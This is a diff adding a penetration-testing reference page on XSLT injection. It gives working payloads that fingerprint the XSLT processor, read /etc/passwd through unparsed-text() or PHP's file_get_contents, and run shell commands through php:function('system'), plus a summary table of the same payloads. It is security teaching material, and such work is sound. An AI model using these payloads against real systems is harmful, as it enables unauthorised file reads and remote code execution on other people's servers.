@@ -1,0 +1,91 @@
+---
+title: "XSLT Injection"
+---
+
+XSLT (Extensible Stylesheet Language Transformations) transforms XML documents into other formats (HTML, plain text, other XML). Web applications that use XSLT to render content dynamically may pass user input into the XSL document before processing. When they do, an attacker can inject additional XSL elements that the XSLT processor executes during output generation.
+
+## Confirming XSLT Injection
+
+Inject a broken XML tag to provoke a parser error:
+
+```
+<
+```
+
+A server error in response suggests the input is reaching an XML or XSLT processor. Follow up with a benign XSL element to confirm execution.
+
+## Information Disclosure
+
+Inject `system-property()` calls to fingerprint the XSLT processor and version:
+
+```xml wrap
+Version: <xsl:value-of select="system-property('xsl:version')" />
+Vendor: <xsl:value-of select="system-property('xsl:vendor')" />
+Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" />
+Product Name: <xsl:value-of select="system-property('xsl:product-name')" />
+Product Version: <xsl:value-of select="system-property('xsl:product-version')" />
+```
+
+If the server returns version and vendor information instead of the raw tags, XSLT injection is confirmed. The vendor and version determine which exploitation paths are available.
+
+## Local File Read
+
+### XSLT 2.0+ (unparsed-text)
+
+```xml wrap
+<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')" />
+```
+
+Only available in XSLT 2.0 and later. The libxslt library (common on Linux) is XSLT 1.0 only and will error on this function.
+
+### PHP Functions (libxslt with PHP bindings)
+
+If the XSLT library is configured to allow PHP function calls:
+
+```xml wrap
+<xsl:value-of select="php:function('file_get_contents','/etc/passwd')" />
+```
+
+## Remote Code Execution
+
+When PHP functions are enabled in the XSLT processor:
+
+```xml wrap
+<xsl:value-of select="php:function('system','id')" />
+<xsl:value-of select="php:function('shell_exec','id')" />
+<xsl:value-of select="php:function('passthru','id')" />
+```
+
+## XSLT Primer
+
+XSLT documents are XML files with XSL elements under the `xsl:` namespace. Key elements:
+
+| Element | Description |
+|---------|-------------|
+| `<xsl:template match="...">` | Defines a template applied to matching XML nodes |
+| `<xsl:value-of select="...">` | Outputs the value of an XPath expression |
+| `<xsl:for-each select="...">` | Loops over matching nodes |
+| `<xsl:if test="...">` | Conditional output |
+| `<xsl:sort select="..." order="...">` | Sort inside a for-each |
+
+Example XSLT that reads an XML document and outputs all fruit names and colours:
+
+```xml wrap
+<?xml version="1.0"?>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+  <xsl:template match="/fruits">
+    <xsl:for-each select="fruit">
+      <xsl:value-of select="name"/> (<xsl:value-of select="color"/>)
+    </xsl:for-each>
+  </xsl:template>
+</xsl:stylesheet>
+```
+
+## Exploitation Summary
+
+| Goal | Payload | Requirement |
+|------|---------|-------------|
+| Fingerprint processor | `system-property('xsl:version')` | Any XSLT |
+| File read | `unparsed-text('/etc/passwd', 'utf-8')` | XSLT 2.0+ |
+| File read | `php:function('file_get_contents','/etc/passwd')` | PHP + libxslt |
+| RCE | `php:function('system','id')` | PHP + libxslt |
